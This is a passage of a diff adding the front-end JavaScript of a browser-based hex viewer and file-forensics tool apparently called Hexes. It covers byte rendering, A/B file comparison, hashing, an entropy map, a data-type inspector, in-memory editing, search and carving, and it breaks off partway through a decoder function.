+  clearTimeout(toast.t); toast.t = setTimeout(() => (t.hidden = true), ms);
+}
+function status(msg) { $('#stMsg').textContent = msg || ''; }
+async function copyText(text, label) {
+  try { await navigator.clipboard.writeText(text); toast(`Copied ${label}`); }
+  catch { toast('Clipboard is unavailable in this browser'); }
+}
+function b64encode(bytes) {
+  let s = ''; for (let i = 0; i < bytes.length; i += 0x8000) s += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000));
+  return btoa(s);
+}
+
+// All "API" calls are served in the browser by HexesBackend (File.slice + a Web Worker). Nothing is uploaded.
+function api(path, opts = {}) { return window.HexesBackend.request(path, opts); }
+
+// ---------------------------------------------------------------- bytes
+const chunkOf = o => Math.floor(o / CHUNK);
+function loadChunk(ci) {
+  if (!S.file || S.chunks.has(ci) || S.loading.has(ci)) return;
+  const id = S.file.id;
+  S.loading.add(ci);
+  api(`read?id=${id}&offset=${ci * CHUNK}&length=${CHUNK}`)
+    .then(buf => {
+      if (!S.file || S.file.id !== id) return;
+      S.chunks.set(ci, buf);
+      trimCache();
+      if (ci === 0) detectHeader();
+      scheduleRender();
+    })
+    .catch(e => status(e.message))
+    .finally(() => S.loading.delete(ci));
+}
+function trimCache() {
+  if (S.chunks.size <= MAX_CHUNKS) return;
+  const keep = new Set([0, chunkOf(S.cur), chunkOf(S.top * ROW), chunkOf((S.top + S.rows) * ROW)]);
+  for (const k of S.chunks.keys()) {
+    if (S.chunks.size <= MAX_CHUNKS) break;
+    if (!keep.has(k)) S.chunks.delete(k);
+  }
+}
+function rawAt(o) {
+  const c = S.chunks.get(chunkOf(o));
+  if (!c) { loadChunk(chunkOf(o)); return undefined; }
+  return c[o % CHUNK];
+}
+function byteAt(o) {
+  if (o < 0 || o >= S.size) return undefined;
+  const e = S.edits.get(o);
+  return e !== undefined ? e : rawAt(o);
+}
+function bytesAt(o, n) {
+  const out = [];
+  for (let i = 0; i < n && o + i < S.size; i++) {
+    const b = byteAt(o + i);
+    if (b === undefined) return null;
+    out.push(b);
+  }
+  return out;
+}
+// file B (comparison file, read-only)
+function loadChunkB(ci) {
+  const B = S.B;
+  if (!B || B.chunks.has(ci) || B.loading.has(ci)) return;
+  B.loading.add(ci);
+  api(`read?id=${B.file.id}&offset=${ci * CHUNK}&length=${CHUNK}`)
+    .then(buf => {
+      if (S.B !== B) return;
+      B.chunks.set(ci, buf);
+      if (B.chunks.size > MAX_CHUNKS) {
+        const keep = new Set([0, chunkOf(S.cur), chunkOf(S.top * ROW), chunkOf((S.top + S.rows) * ROW)]);
+        for (const k of B.chunks.keys()) { if (B.chunks.size <= MAX_CHUNKS) break; if (!keep.has(k)) B.chunks.delete(k); }
+      }
+      if (ci === 0) {
+        const m = window.detectMagic(buf.subarray(0, 64));
+        $('#evTypeB').textContent = m ? m.label : 'No known signature at offset 0';
+      }
+      scheduleRender();
+    })
+    .catch(e => status(e.message))
+    .finally(() => B.loading.delete(ci));
+}
+function byteB(o) {
+  const B = S.B;
+  if (!B || o < 0 || o >= B.size) return undefined;
+  const c = B.chunks.get(chunkOf(o));
+  if (!c) { loadChunkB(chunkOf(o)); return undefined; }
+  return c[o % CHUNK];
+}
+const sideSize = side => side === 'b' ? (S.B ? S.B.size : 0) : S.size;
+const sideByte = (o, side) => side === 'b' ? byteB(o) : byteAt(o);
+function sideBytes(o, n, side) {
+  const out = [], size = sideSize(side);
+  for (let i = 0; i < n && o + i < size; i++) {
+    const b = sideByte(o + i, side);
+    if (b === undefined) return null;
+    out.push(b);
+  }
+  return out;
+}
+const viewSize = () => S.B ? Math.max(S.size, S.B.size) : S.size;
+const activeFile = () => (S.side === 'b' && S.B) ? S.B.file : S.file;
+
+function selRange() {
+  if (S.anchor === null) return null;
+  return [Math.min(S.anchor, S.cur), Math.max(S.anchor, S.cur)];
+}
+function entropyAt(o) {
+  if (!S.ent || !S.ent.values.length || !S.ent.block) return 0;
+  return S.ent.values[Math.floor(o / S.ent.block)] || 0;
+}
+
+// ---------------------------------------------------------------- open
+async function openWith(body) {
+  status('Opening…');
+  try {
+    const f = await api('open', { method: 'POST', body });
+    loadFile(f);
+  } catch (e) { toast(e.message, 5000); status(''); }
+}
+
+function loadFile(f) {
+  Object.assign(S, {
+    file: f, size: f.size, digits: Math.max(8, f.size.toString(16).length),
+    top: 0, cur: 0, anchor: null, nib: null, edits: new Map(),
+    chunks: new Map(), loading: new Set(), ent: null, magic: null, hash: null,
+    hits: [], hitIdx: -1, match: null, job: null, side: 'a',
+  });
+  S.digits = Math.max(8, viewSize().toString(16).length);
+  setEdit(false);
+  $('#welcome').hidden = true;
+  $('#evidence').hidden = false;
+  $('#evName').textContent = f.name;
+  $('#evName').title = f.name;
+  $('#evMtime').textContent = f.mtime ? 'Modified ' + f.mtime.replace('T', ' ').replace(/\.\d+Z$/, ' UTC') : '';
+  $('#evType').textContent = f.size ? 'Identifying…' : 'Empty file';
+  $('#evSize').textContent = fmtSize(f.size);
+  $('#evMd5').textContent = 'hashing…';
+  $('#evSha').textContent = 'hashing…';
+  $('#searchResults').innerHTML = '';
+  $('#searchHead').textContent = '';
+  $('#decOut').innerHTML = '';
+  $('#selOut').innerHTML = '';
+  document.title = `${f.name} · Hexes`;
+  status('');
+  renderHead();
+  render();
+  pollHash(f.id);
+  pollEntropy(f.id);
+  if (S.B) runCompare();
+}
+
+function detectHeader() {
+  const c = S.chunks.get(0);
+  if (!c) return;
+  S.magic = window.detectMagic(c.subarray(0, 64));
+  $('#evType').textContent = S.magic ? S.magic.label : 'No known signature at offset 0';
+}
+
+async function pollHash(id, isB = false) {
+  const sfx = isB ? 'B' : '';
+  const live = () => isB ? (S.B && S.B.file.id === id) : (S.file && S.file.id === id);
+  while (live()) {
+    let h;
+    try { h = await api('hash?id=' + id); } catch { return; }
+    if (!live()) return;
+    if (h.state === 'done') {
+      if (isB) S.B.hash = h; else S.hash = h;
+      $('#evMd5' + sfx).textContent = h.md5;
+      $('#evSha' + sfx).textContent = h.sha256;
+      if (S.cmp) renderCmpSummary();
+      return;
+    }
+    if (h.state === 'error') { $('#evMd5' + sfx).textContent = $('#evSha' + sfx).textContent = 'hash failed: ' + h.error; return; }
+    const pct = h.size ? Math.floor((h.done / h.size) * 100) : 100;
+    $('#evMd5' + sfx).textContent = $('#evSha' + sfx).textContent = `hashing… ${pct}%`;
+    await sleep(400);
+  }
+}
+
+async function pollEntropy(id) {
+  while (S.file && S.file.id === id) {
+    let e;
+    try { e = await api('entropy?id=' + id); } catch { return; }
+    if (!S.file || S.file.id !== id) return;
+    S.ent = e;
+    drawTrack();
+    if (e.state !== 'running') {
+      render();
+      summarizeEntropy();
+      return;
+    }
+    $('#stEntropy').textContent = `Mapping entropy… ${Math.floor((e.values.length / e.buckets) * 100)}%`;
+    await sleep(300);
+  }
+}
+
+function summarizeEntropy() {
+  const e = S.ent;
+  if (!e || e.state !== 'done') { $('#stEntropy').textContent = e && e.error ? 'Entropy failed: ' + e.error : ''; return; }
+  let regions = 0, inRun = false;
+  for (const v of e.values) { const hot = v >= HOT; if (hot && !inRun) regions++; inRun = hot; }
+  $('#stEntropy').textContent = regions
+    ? `${regions} high-entropy region${regions > 1 ? 's' : ''} (≥ ${HOT} bits/byte)${e.sampled ? ', sampled' : ''}`
+    : `No high-entropy regions${e.sampled ? ' (sampled)' : ''}`;
+}
+
+// ---------------------------------------------------------------- render
+let rq = 0;
+function scheduleRender() { if (!rq) rq = requestAnimationFrame(() => { rq = 0; render(); }); }
+const totalRows = () => Math.max(1, Math.ceil(viewSize() / ROW));
+const maxTop = () => Math.max(0, totalRows() - S.rows);
+
+function renderHead() {
+  let hx = '';
+  for (let i = 0; i < ROW; i++) hx += `<span>${HX2[i]}</span>`;
+  const label = 'Offset'.padEnd(S.digits, ' ');
+  $('#viewHead').innerHTML = `<div class="row"><span class="off">${label}</span><span class="hx">${hx}</span><span class="as">${S.B ? '<span class="who">A</span>&nbsp;text' : 'Decoded text'}</span></div>`;
+  $('#viewHeadB').innerHTML = `<div class="row"><span class="hx">${hx}</span><span class="as"><span class="who">B</span>&nbsp;text</span></div>`;
+}
+
+function buildRows(side) {
+  const isA = side === 'a', other = isA ? 'b' : 'a', cmp = !!S.B;
+  const size = sideSize(side), osize = sideSize(other), vsize = viewSize();
+  const sel = selRange(), m = S.match;
+  let html = '';
+  for (let r = 0; r < S.rows; r++) {
+    const base = (S.top + r) * ROW;
+    if (base >= vsize && !(base === 0 && vsize === 0)) break;
+    let hx = '', as = '';
+    for (let i = 0; i < ROW; i++) {
+      const o = base + i;
+      if (o >= size) { hx += '<span>  </span>'; as += '<span> </span>'; continue; }
+      const b = sideByte(o, side);
+      let cls = b === undefined ? 'ld' : b === 0 ? 'z' : (b >= 0x20 && b < 0x7f ? 'p' : 'n');
+      if (isA && S.edits.has(o)) cls += ' ed';
+      if (cmp && b !== undefined) {
+        if (o >= osize) cls += ' xs';
+        else { const ob = sideByte(o, other); if (ob !== undefined && ob !== b) cls += ' df'; }
+      }
+      if (sel && o >= sel[0] && o <= sel[1]) cls += ' sl';
+      else if (m && o >= m[0] && o < m[0] + m[1]) cls += ' mt';
+      if (o === S.cur) cls += S.nib !== null && side === S.side ? ' cu nib' : ' cu';
+      const ch = b === undefined ? '·' : (b >= 0x20 && b < 0x7f ? esc(String.fromCharCode(b)) : '.');
+      hx += `<span class="${cls}" data-o="${o}">${b === undefined ? '··' : HX2[b]}</span>`;
+      as += `<span class="${cls}" data-o="${o}">${ch}</span>`;
+    }
+    const off = isA ? `<span class="off${entropyAt(base) >= HOT ? ' hot' : ''}">${hexOff(base)}</span>` : '';
+    html += `<div class="row">${off}<span class="hx">${hx}</span><span class="as">${as}</span></div>`;
+  }
+  return html;
+}
+
+function render() {
+  const grid = $('#grid');
+  S.rowH = parseFloat(getComputedStyle(document.documentElement).getPropertyValue('--row')) || 22;
+  S.rows = Math.max(1, Math.floor((grid.clientHeight - 2) / S.rowH));
+  S.top = clamp(S.top, 0, maxTop());
+  grid.className = 'grid pane-' + (S.side === 'a' ? S.pane : 'none');
+
+  if (!S.file) { grid.innerHTML = ''; drawTrack(); renderInspector(); renderStatus(); renderSelection(); return; }
+
+  grid.innerHTML = buildRows('a');
+  if (S.B) {
+    const gb = $('#gridB');
+    gb.className = 'grid pane-' + (S.side === 'b' ? S.pane : 'none');
+    gb.innerHTML = buildRows('b');
+  }
+  drawTrack();
+  renderInspector();
+  renderStatus();
+  renderSelection();
+}
+
+function renderStatus() {
+  if (!S.file) { $('#stOffset').textContent = 'Offset —'; $('#stSel').textContent = ''; }
+  else {
+    $('#stOffset').textContent = `${S.B ? S.side.toUpperCase() + ' · ' : ''}Offset ${h0x(S.cur)} (${S.cur.toLocaleString()})`;
+    const s = selRange();
+    $('#stSel').textContent = s ? `Selected ${(s[1] - s[0] + 1).toLocaleString()} bytes, ${h0x(s[0])}–${h0x(s[1])}` : '';
+  }
+  $('#stEndian').textContent = S.le ? 'Little-endian' : 'Big-endian';
+}
+
+// ---------------------------------------------------------------- inspector
+const pad = (n, w = 2) => String(n).padStart(w, '0');
+function isoUTC(d, frac7) {
+  if (isNaN(d)) return null;
+  const y = d.getUTCFullYear();
+  if (y < 1601 || y > 9999) return null;
+  const base = `${pad(y, 4)}-${pad(d.getUTCMonth() + 1)}-${pad(d.getUTCDate())} ${pad(d.getUTCHours())}:${pad(d.getUTCMinutes())}:${pad(d.getUTCSeconds())}`;
+  return base + (frac7 !== undefined ? '.' + pad(frac7, 7) : '.' + pad(d.getUTCMilliseconds(), 3)) + ' UTC';
+}
+function filetime(v) {
+  if (v === 0n) return '0 (not set)';
+  const secs = v / 10000000n, frac = Number(v % 10000000n);
+  const ms = Number(secs - 11644473600n) * 1000;
+  return isoUTC(new Date(ms), frac);
+}
+function unixS(u) { return u === 0 ? '0 (not set)' : isoUTC(new Date(u * 1000)); }
+function unixMs(v) { return v === 0n ? '0 (not set)' : v > 253402300799999n ? null : isoUTC(new Date(Number(v))); }
+function dosTime(t, d) {
+  const y = ((d >> 9) & 0x7f) + 1980, mo = (d >> 5) & 15, da = d & 31, h = t >> 11, mi = (t >> 5) & 63, s = (t & 31) * 2;
+  if (!mo || mo > 12 || !da || h > 23 || mi > 59 || s > 59) return null;
+  return `${y}-${pad(mo)}-${pad(da)} ${pad(h)}:${pad(mi)}:${pad(s)} (local)`;
+}
+function ipv6(b) {
+  const g = []; for (let i = 0; i < 16; i += 2) g.push((b[i] << 8) | b[i + 1]);
+  let bs = -1, bl = 0;
+  for (let i = 0; i < 8;) { if (g[i]) { i++; continue; } let j = i; while (j < 8 && !g[j]) j++; if (j - i > bl) { bs = i; bl = j - i; } i = j; }
+  const hx = g.map(x => x.toString(16));
+  if (bl < 2) return hx.join(':');
+  return hx.slice(0, bs).join(':') + '::' + hx.slice(bs + bl).join(':');
+}
+function guid(b) {
+  const h = i => HX2[b[i]];
+  return `{${h(3)}${h(2)}${h(1)}${h(0)}-${h(5)}${h(4)}-${h(7)}${h(6)}-${h(8)}${h(9)}-${h(10)}${h(11)}${h(12)}${h(13)}${h(14)}${h(15)}}`;
+}
+const fmtFloat = f => (Number.isFinite(f) && f !== 0 && (Math.abs(f) < 1e-6 || Math.abs(f) > 1e15)) ? f.toExponential(6) : String(+f.toPrecision(9));
+const printable = b => (b >= 0x20 && b < 0x7f) ? String.fromCharCode(b) : '·';
+
+function renderInspector() {
+  const t = $('#insp');
+  if (!S.file || !S.size) { t.innerHTML = ''; $('#inspAt').textContent = '—'; return; }
+  const sel = selRange();
+  const at = sel ? sel[0] : S.cur;
+  const side = S.B ? S.side : 'a';
+  $('#inspAt').textContent = (S.B ? side.toUpperCase() + ' · ' : '') + h0x(at) + (sel ? ' (selection start)' : '');
+  const raw = sideBytes(at, 16, side);
+  if (!raw) { t.innerHTML = '<tr><td class="na">Loading bytes…</td></tr>'; return; }
+  if (!raw.length) { t.innerHTML = `<tr><td class="na">Past the end of file ${side.toUpperCase()}</td></tr>`; return; }
+  const n = raw.length, le = S.le;
+  const dv = new DataView(new Uint8Array(raw).buffer);
+  const rows = [];
+  const g = name => rows.push(`<tr class="grp"><th colspan="2">${name}</th></tr>`);
+  const r = (k, v) => rows.push(`<tr><th>${k}</th><td${v == null ? ' class="na"' : ''}>${v == null ? '—' : esc(v)}</td></tr>`);
+  if (S.B) {
+    const fmt = (v, sz) => at >= sz ? 'past end of file' : v === undefined ? '…' : `${HX2[v]}  (${v}${v >= 0x20 && v < 0x7f ? ", '" + String.fromCharCode(v) + "'" : ''})`;
+    const va = byteAt(at), vb = byteB(at);
+    g('A vs B here');
+    rows.push(`<tr><th>A</th><td>${esc(fmt(va, S.size))}</td></tr><tr><th>B</th><td class="${va !== vb ? 'sig' : ''}">${esc(fmt(vb, S.B.size))}</td></tr>`);
+    const run = runAt(at);
+    r('Difference run', run ? `${h0x(run[0])}, ${run[1].toLocaleString()} byte${run[1] === 1 ? '' : 's'}${run[2] ? ' (only in ' + run[2] + ')' : ''}` : 'none');
+  }
+  const sig = window.detectMagic(raw);
+  if (sig) rows.push(`<tr><th>Signature</th><td class="sig">${esc(sig.label)}</td></tr>`);
+  g(`Integers · ${le ? 'little' : 'big'}-endian`);
+  r('Int8 / UInt8', `${dv.getInt8(0)} / ${dv.getUint8(0)}`);
+  r('Binary', dv.getUint8(0).toString(2).padStart(8, '0'));
+  r('Int16 / UInt16', n >= 2 ? `${dv.getInt16(0, le)} / ${dv.getUint16(0, le)}` : null);
+  r('Int32 / UInt32', n >= 4 ? `${dv.getInt32(0, le)} / ${dv.getUint32(0, le)}` : null);
+  r('Int64 / UInt64', n >= 8 ? `${dv.getBigInt64(0, le)} / ${dv.getBigUint64(0, le)}` : null);
+  r('Float32', n >= 4 ? fmtFloat(dv.getFloat32(0, le)) : null);
+  r('Float64', n >= 8 ? fmtFloat(dv.getFloat64(0, le)) : null);
+  g('Timestamps');
+  r('Windows FILETIME', n >= 8 ? filetime(dv.getBigUint64(0, le)) : null);
+  r('Unix epoch (32-bit s)', n >= 4 ? unixS(dv.getUint32(0, le)) : null);
+  r('Unix epoch (64-bit ms)', n >= 8 ? unixMs(dv.getBigUint64(0, le)) : null);
+  r('DOS date/time', n >= 4 ? dosTime(dv.getUint16(0, le), dv.getUint16(2, le)) : null);
+  g('Network & IDs');
+  r('IPv4', n >= 4 ? raw.slice(0, 4).join('.') : null);
+  r('IPv6', n >= 16 ? ipv6(raw) : null);
+  r('GUID', n >= 16 ? guid(raw) : null);
+  g('Text');
+  r('ASCII', raw.map(printable).join(''));
+  let u16 = '';
+  for (let i = 0; i + 1 < n; i += 2) { const c = raw[i] | (raw[i + 1] << 8); u16 += c >= 0x20 && c !== 0x7f && !(c >= 0xd800 && c < 0xe000) ? String.fromCharCode(c) : '·'; }
+  r('UTF-16LE', u16 || null);
+  t.innerHTML = rows.join('');
+}
+
+// ---------------------------------------------------------------- entropy track
+function hexToRgb(h) {
+  h = h.trim().replace('#', '');
+  if (h.length === 3) h = h.split('').map(c => c + c).join('');
+  const n = parseInt(h, 16); return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
+}
+const mix = (a, b, t) => a.map((v, i) => Math.round(v + (b[i] - v) * t));
+function drawTrack() {
+  const c = $('#track'), dpr = window.devicePixelRatio || 1;
+  const w = c.clientWidth, h = c.clientHeight;
+  if (!w || !h) return;
+  if (c.width !== Math.round(w * dpr) || c.height !== Math.round(h * dpr)) { c.width = Math.round(w * dpr); c.height = Math.round(h * dpr); }
+  const ctx = c.getContext('2d');
+  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
+  ctx.clearRect(0, 0, w, h);
+  const VS = viewSize();
+  if (!S.file || !VS) return;
+  const cs = getComputedStyle(document.documentElement);
+  const tok = k => cs.getPropertyValue(k).trim();
+  const lo = hexToRgb(tok('--ent-lo')), mid = hexToRgb(tok('--ent-mid')), hi = hexToRgb(tok('--ent-hi'));
+  const cmp = !!S.B;
+  const entX = cmp ? 14 : 7, entW = w - entX - 2;
+
+  // entropy of file A, mapped by offset
+  const vals = S.ent ? S.ent.values : [], block = S.ent ? S.ent.block : 0;
+  if (vals.length && block) {
+    for (let y = 0; y < h; y++) {
+      const a = Math.floor((y / h) * VS / block), b = Math.max(a + 1, Math.floor(((y + 1) / h) * VS / block));
+      if (a >= vals.length) break;
+      let e = 0;
+      for (let i = a; i < b && i < vals.length; i++) e = Math.max(e, vals[i]);
+      const rgb = e < 6 ? mix(lo, mid, e / 6) : mix(mid, hi, clamp((e - 6) / 2, 0, 1));
+      ctx.fillStyle = `rgb(${rgb})`;
+      ctx.fillRect(entX, y, entW, 1);
+    }
+  }
+  // difference map (compare mode)
+  if (cmp && S.cmp && S.cmp.map) {
+    const map = S.cmp.map, bs = S.cmp.bucketSize;
+    ctx.fillStyle = tok('--edited');
+    for (let y = 0; y < h; y++) {
+      const a = Math.floor((y / h) * VS / bs), b = Math.max(a + 1, Math.floor(((y + 1) / h) * VS / bs));
+      let n = 0;
+      for (let i = a; i < b && i < map.length; i++) n += map[i];
+      if (n) ctx.fillRect(1, y, 11, 1);
+    }
+  }
+  // search hits
+  if (S.hits.length) {
+    ctx.fillStyle = tok('--accent');
+    let last = -2;
+    for (const [o] of S.hits) {
+      const y = Math.floor((o / VS) * h);
+      if (y === last) continue; last = y;
+      ctx.fillRect(cmp ? w - 6 : 1, y, 5, 2);
+    }
+  }
+  // viewport
+  const y0 = (S.top * ROW / VS) * h;
+  const y1 = Math.max(y0 + 4, ((S.top + S.rows) * ROW / VS) * h);
+  ctx.strokeStyle = tok('--fg');
+  ctx.lineWidth = 1.5;
+  ctx.strokeRect(1.5, y0 + 0.75, w - 3, Math.min(h - 1.5, y1) - y0 - 0.75);
+  // cursor
+  ctx.fillStyle = tok('--cursor');
+  ctx.fillRect(0, Math.floor((S.cur / VS) * h), w, 1.5);
+}
+
+// ---------------------------------------------------------------- navigation & editing
+function ensureVisible() {
+  const row = Math.floor(S.cur / ROW);
+  if (row < S.top) S.top = row;
+  else if (row >= S.top + S.rows) S.top = row - S.rows + 1;
+}
+function centerOn(o) {
+  S.top = clamp(Math.floor(o / ROW) - Math.floor(S.rows / 3), 0, maxTop());
+}
+function moveTo(o, extend) {
+  if (!S.file || !viewSize()) return;
+  o = clamp(o, 0, viewSize() - 1);
+  if (extend) { if (S.anchor === null) S.anchor = S.cur; }
+  else S.anchor = null;
+  S.cur = o; S.nib = null;
+  ensureVisible();
+  render();
+}
+
+function setEdit(on) {
+  S.edit = on;
+  document.body.classList.toggle('editing', on);
+  $('#lockText').textContent = on ? 'Unsealed · editing in memory' : 'Sealed · read-only';
+  updateEditUI();
+}
+function updateEditUI() {
+  const n = S.edits.size;
+  $('#editActions').hidden = !(S.edit || n);
+  $('#editCount').textContent = `${n} change${n === 1 ? '' : 's'}`;
+  $('#exportBtn').disabled = $('#revertBtn').disabled = !n;
+}
+function setByte(o, v) {
+  if (o >= S.size) return false;
+  const orig = rawAt(o);
+  if (orig === undefined) { status('Byte not loaded yet'); return false; }
+  if (v === orig) S.edits.delete(o); else S.edits.set(o, v);
+  updateEditUI();
+  return true;
+}
+function typeNibble(d) {
+  const b = byteAt(S.cur);
+  if (b === undefined) return;
+  if (S.nib === null) {
+    if (setByte(S.cur, (d << 4) | (b & 15))) { S.nib = 1; render(); }
+  } else if (setByte(S.cur, (b & 0xf0) | d)) {
+    S.nib = null;
+    S.cur < S.size - 1 ? moveTo(S.cur + 1) : render();
+  }
+}
+
+function parseOffset(str) {
+  let s = str.trim().replace(/[_\s,]/g, '');
+  let rel = 0;
+  if (s[0] === '+') { rel = 1; s = s.slice(1); } else if (s[0] === '-') { rel = -1; s = s.slice(1); }
+  let n;
+  if (/^0x[0-9a-f]+$/i.test(s)) n = parseInt(s.slice(2), 16);
+  else if (/^[0-9a-f]+h$/i.test(s)) n = parseInt(s.slice(0, -1), 16);
+  else if (/^\d+$/.test(s)) n = parseInt(s, 10);
+  else if (/^[0-9a-f]+$/i.test(s)) n = parseInt(s, 16);
+  else return null;
+  return rel ? S.cur + rel * n : n;
+}
+
+// ---------------------------------------------------------------- search
+const PLACEHOLDERS = { hex: '4D 5A ?? 00', ascii: 'password', utf16: 'cmd.exe', regex: 'https?://[\\w./-]+' };
+
+async function runSearch(e) {
+  e.preventDefault();
+  if (!S.file) return toast('Open a file first');
+  const q = $('#searchQ').value;
+  const fid = activeFile().id;
+  const body = { id: fid, q, type: $('#searchType').value, ci: $('#searchCi').checked, from: $('#searchFromCursor').checked ? S.cur : 0 };
+  let job;
+  try { ({ job } = await api('search', { method: 'POST', body })); }
+  catch (err) { $('#searchHead').textContent = err.message; return; }
+  S.job = job; S.hits = []; S.hitIdx = -1; S.match = null;
+  $('#searchResults').innerHTML = '';
+  $('#searchProg').hidden = false;
+  $('#searchCancel').hidden = false;
+  const id = fid;
+  S.jobFile = fid;
+  while (S.job === job) {
+    let res;
+    try { res = await api(`search?id=${id}&job=${job}&since=${S.hits.length}`); }
+    catch (err) { $('#searchHead').textContent = err.message; break; }
+    if (S.job !== job) return;
+    appendHits(res.matches);
+    $('#searchProg').firstElementChild.style.width = (res.total ? (res.done / res.total) * 100 : 100) + '%';
+    const n = res.count;
+    let msg = `${n.toLocaleString()} match${n === 1 ? '' : 'es'}`;
+    if (res.state === 'running') msg += ' · searching…';
+    if (res.truncated) msg += ' · stopped at 5,000';
+    if (res.state === 'cancelled') msg += ' · stopped';
+    if (res.state === 'error') msg = 'Search failed: ' + res.error;
+    $('#searchHead').textContent = msg;
+    drawTrack();
+    if (res.state !== 'running') break;
+    await sleep(250);
+  }
+  $('#searchProg').hidden = true;
+  $('#searchCancel').hidden = true;
+  if (S.hits.length && S.hitIdx < 0) gotoHit(0);
+}
+
+function appendHits(list) {
+  if (!list.length) return;
+  const ol = $('#searchResults'), frag = document.createDocumentFragment();
+  for (const m of list) {
+    const i = S.hits.length;
+    S.hits.push(m);
+    const li = document.createElement('li');
+    li.dataset.i = i;
+    li.innerHTML = `<span class="ro">${hexOff(m[0])}</span><span class="rp">${m[2] ? esc(m[2]) : m[1] + ' bytes'}</span>`;
+    frag.appendChild(li);
+  }
+  ol.appendChild(frag);
+}
+
+function gotoHit(i) {
+  if (!S.hits.length) return;
+  i = (i + S.hits.length) % S.hits.length;
+  S.hitIdx = i;
+  const [o, len] = S.hits[i];
+  S.match = [o, len];
+  S.anchor = null; S.nib = null;
+  S.cur = o;
+  const row = Math.floor(o / ROW);
+  if (row < S.top || row >= S.top + S.rows) centerOn(o);
+  document.querySelectorAll('#searchResults li.on').forEach(li => li.classList.remove('on'));
+  const li = $(`#searchResults li[data-i="${i}"]`);
+  if (li) {
+    li.classList.add('on');
+    const ol = li.parentElement;
+    if (li.offsetTop < ol.scrollTop) ol.scrollTop = li.offsetTop;
+    else if (li.offsetTop + li.offsetHeight > ol.scrollTop + ol.clientHeight) ol.scrollTop = li.offsetTop + li.offsetHeight - ol.clientHeight;
+  }
+  render();
+}
+
+// ---------------------------------------------------------------- selection, decode, carve
+async function selectionBytes(max = 1 << 20) {
+  const s = selRange();
+  if (!s) throw new Error('Select some bytes in the grid first (drag, or Shift+arrows)');
+  const len = s[1] - s[0] + 1;
+  if (len > max) throw new Error(`Selection is ${fmtSize(len)}. This works on up to 1 MiB.`);
+  const buf = await api(`read?id=${activeFile().id}&offset=${s[0]}&length=${len}`);
+  if (S.side === 'a') for (const [o, v] of S.edits) if (o >= s[0] && o <= s[1]) buf[o - s[0]] = v;
+  return { buf, start: s[0], end: s[1] + 1 };
+}
+
+function renderSelection() {
+  const s = selRange();
+  const dl = $('#selInfo');
+  const has = !!(S.file && s);
+  ['#carveBtn', '#hashSelBtn', '#copyHexBtn', '#copyTxtBtn', '#decRun'].forEach(id => ($(id).disabled = !has));
+  $('#decSrc').textContent = has ? `Selection: ${(s[1] - s[0] + 1).toLocaleString()} bytes at ${h0x(s[0])}` : 'No selection';
+  if (!has) { dl.innerHTML = '<dt>Selection</dt><dd>None. Drag across bytes or use Shift+arrows.</dd>'; return; }
+  const len = s[1] - s[0] + 1;
+  dl.innerHTML = `<dt>Start</dt><dd>${h0x(s[0])} (${s[0].toLocaleString()})</dd>
+    <dt>End</dt><dd>${h0x(s[1])} (${s[1].toLocaleString()})</dd>
+    <dt>Length</dt><dd>${h0x(len)} (${len.toLocaleString()} bytes)</dd>`;
+}
+
+function outCard(title, r, extra = '') {
+  return `<div class="out-card"><b>${esc(title)}</b>
+    ${r.file ? `<code>${esc(r.file)}</code>` : ''}
+    ${r.size !== undefined ? `<span>${fmtSize(r.size)}</span>` : ''}
+    <span>MD5 <code>${r.md5}</code></span>
+    <span>SHA-256 <code>${r.sha256}</code></span>
+    ${r.url ? `<a href="${r.url}" download="${esc(r.file)}">Download again</a>` : ''}${extra}</div>`;
+}
+
+async function carve() {
+  const s = selRange(); if (!s) return;
+  try {
+    const r = await api('carve', { method: 'POST', body: { id: activeFile().id, start: s[0], end: s[1] + 1 } });
+    $('#selOut').innerHTML = outCard(`Carved ${S.B ? 'from ' + S.side.toUpperCase() + ' ' : ''}${h0x(s[0])}–${h0x(s[1])}`, r);
+    toast('Carved to ' + r.file);
+  } catch (e) { toast(e.message); }
+}
+async function hashSel() {
+  const s = selRange(); if (!s) return;
+  if (S.side === 'a' && S.edits.size && [...S.edits.keys()].some(o => o >= s[0] && o <= s[1])) toast('Note: hashes are of the original bytes, not your in-memory edits', 4500);
+  try {
+    const r = await api(`hashrange?id=${activeFile().id}&start=${s[0]}&end=${s[1] + 1}`);
+    r.size = s[1] - s[0] + 1;
+    $('#selOut').innerHTML = outCard(`Hash of ${h0x(s[0])}–${h0x(s[1])}`, r);
+  } catch (e) { toast(e.message); }
+}
+async function copySel(kind) {
+  try {
+    const { buf } = await selectionBytes();
+    const text = kind === 'hex' ? Array.from(buf, b => HX2[b]).join(' ') : Array.from(buf, printable).join('');
+    copyText(text, kind === 'hex' ? 'hex' : 'text');
+  } catch (e) { toast(e.message); }
+}
+
+// decoders
+function parseHexKey(str) {
+  const clean = str.replace(/0x/gi, '').replace(/[\s,]+/g, '');
+  if (!clean || clean.length % 2 || /[^0-9a-f]/i.test(clean)) return null;
+  const out = new Uint8Array(clean.length / 2);
+  for (let i = 0; i < out.length; i++) out[i] = parseInt(clean.substr(i * 2, 2), 16);
+  return out;
+}
+function looksUtf16(b) {
+  if (b.length < 4) return false;
+  let z = 0; for (let i = 1; i < b.length; i += 2) if (b[i] === 0) z++;
+  return z >= 0.8 * Math.floor(b.length / 2);
+}
+function textPreview(b, max = 6000) {
+  if (looksUtf16(b)) {
+    let s = ''; for (let i = 0; i + 1 < b.length && s.length < max; i += 2) { const c = b[i] | (b[i + 1] << 8); s += c === 10 || c === 13 || c === 9 || (c >= 0x20 && c !== 0x7f && !(c >= 0xd800 && c < 0xe000)) ? String.fromCharCode(c) : '·'; }
+    return { kind: 'UTF-16LE', text: s };
+  }
+  let s = ''; for (let i = 0; i < b.length && i < max; i++) { const c = b[i]; s += c === 10 || c === 13 || c === 9 || (c >= 0x20 && c < 0x7f) ? String.fromCharCode(c) : '·'; }
+  return { kind: 'ASCII', text: s };
+}
+function printableScore(b) {
+  let p = 0, sp = 0;
+  for (const c of b) { if ((c >= 0x20 && c < 0x7f) || c === 9 || c === 10 || c === 13) p++; if (c === 0x20) sp++; }
+  return (p / b.length) + Math.min(0.15, sp / b.length);
+}
+
+let decResults = [];
+async function runDecode() {
+  let src;
+  try { src = await selectionBytes(); } catch (e) { $('#decOut').innerHTML = `<p class="note">${esc(e.message)}</p>`; return; }
+  const mode = $('#decMode').value;
+  const b = src.buf;
+  decResults = [];
+  try {
+    if (mode === 'b64') {
